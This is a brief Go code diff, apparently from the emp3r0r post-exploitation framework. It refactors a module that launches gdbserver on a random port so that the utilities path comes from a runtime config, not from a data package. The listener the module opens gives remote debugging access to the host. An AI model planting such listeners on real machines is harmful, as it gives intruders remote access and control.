@@ -7,7 +7,6 @@ import (
 	"time"
 
 	"github.com/google/uuid"
-	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
@@ -16,7 +15,7 @@ func moduleGDB() {
 	port := util.RandInt(1024, 65535)
 	portstr := strconv.Itoa(port)
 
-	gdbserver_path := emp3r0r_data.UtilsPath + "/gdbserver"
+	gdbserver_path := RuntimeConfig.UtilsPath + "/gdbserver"
 	gdbserver_cmd := fmt.Sprintf("%s --multi :%d",
 		gdbserver_path, port)
 
